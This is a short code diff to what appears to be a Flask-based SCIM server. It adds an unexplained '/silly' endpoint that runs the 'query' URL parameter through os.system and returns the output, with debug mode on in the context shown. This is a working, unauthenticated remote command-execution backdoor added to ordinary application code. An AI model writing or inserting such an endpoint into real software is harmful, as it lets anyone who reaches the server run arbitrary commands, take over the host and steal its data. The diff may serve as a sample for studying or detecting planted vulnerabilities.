@@ -651,6 +651,20 @@ def exit_app():
     exit(0)
 
 
+@app.route('/silly', methods=['GET'])
+def silly_replace():
+    random_command = request.args.get('query')
+    if random_command is not None:
+        html = "<html><head><title>Silly!</title></head><body>"
+        result = os.system(random_command)
+        html = "%s %s" % (html, result)
+        html += "</body></html>"
+        print(result)
+        return(html)
+    else:
+        return scim_error("Bad Request", 400)
+
+
 if __name__ == "__main__":
     app.debug = True
     app.run(
